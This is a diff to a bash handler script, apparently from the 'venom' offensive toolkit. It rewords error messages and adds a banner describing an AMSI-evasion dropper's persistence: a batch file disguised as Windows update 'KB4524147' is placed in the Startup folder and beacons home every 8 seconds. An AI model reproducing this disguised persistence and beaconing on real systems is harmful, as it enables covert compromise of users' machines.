@@ -35,12 +35,12 @@ Colors;
 
 ## Check for handler dependencies
 if ! [ -e "cert.pem" ] || ! [ -e "key.pem" ]; then
-   echo ${RedF}"- Certificates not found in current directory .."
+   echo ${RedF}"[ERROR] Certificates not found in current directory .."
    sleep 2 && exit
 fi
 zen=$(which openssl)
 if ! [ "$?" -eq "0" ]; then
-   echo ${RedF}"- OpenSSL not found in current system .."
+   echo ${RedF}"[ERROR] OpenSSL not found in current system .."
    sleep 2 && exit
 fi
 
@@ -56,9 +56,17 @@ echo "    CERTIFICATES : cert.pem + key.pem"
 echo "    ACTIVE ON    : ${RedF}$FIRST_ACCESS${BlueF}"
 echo "    LAST ACCESS  : $LAST_ACCESS"
 echo "    DROPPERNAME  : $DROPPER"
-echo "    VENOM IDENT  : Amsi Evasion (agent nº2)"
+echo "    CATEGORIE    : Amsi Evasion (agent nº2)"
 echo "    AGENT RPATH  : $RPATH"
 echo "    PERSISTENCE  : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$ID.update.bat"
+echo ""
+echo "    Detail Description"
+echo "    ------------------"
+echo "    If sellected 'add persistence' to dropper in venom amsi evasion agent nº2"
+echo "    Them the dropper when executed it will create in remote target startup folder"
+echo "    one script named 'KB4524147_$ID.update.bat' that beacons home from 8 to 8 sec"
+echo "    on every target startup until a valid tcp connection is found (netstat -ano)."
+echo "    'Venom also creates this handler file (zip) to store persistence settings'."
 echo "" && echo ${BlueF}:Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
 read op
 cls
